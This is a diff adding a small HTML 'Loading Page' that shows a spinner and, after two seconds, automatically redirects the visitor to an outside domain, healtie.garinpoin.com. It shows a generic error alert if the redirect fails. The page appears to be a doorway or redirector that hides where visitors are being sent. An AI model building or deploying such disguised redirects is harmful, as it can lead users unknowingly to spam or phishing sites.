@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Loading Page</title>
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background-color: #f0f0f0;
+      }
+      .loader-wrapper {
+        text-align: center;
+      }
+      .loader {
+        border: 8px solid #3498db;
+        border-top: 8px solid #f0f0f0;
+        border-radius: 50%;
+        width: 50px;
+        height: 50px;
+        animation: spin 1s linear infinite;
+      }
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+      p {
+        margin-top: 10px;
+        font-size: 18px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="loader-wrapper">
+      <div class="loader"></div>
+      <p>Loading...</p>
+    </div>
+    <script>
+      window.addEventListener("load", () => {
+        const e = document.querySelector(".loader-wrapper");
+        setTimeout(() => {
+          try {
+            window.location.href = "https://healtie.garinpoin.com";
+            e.style.display = "none";
+          } catch (error) {
+            alert("Error: Internal Connection");
+          }
+        }, 2000);
+      });
+    </script>
+  </body>
+</html>
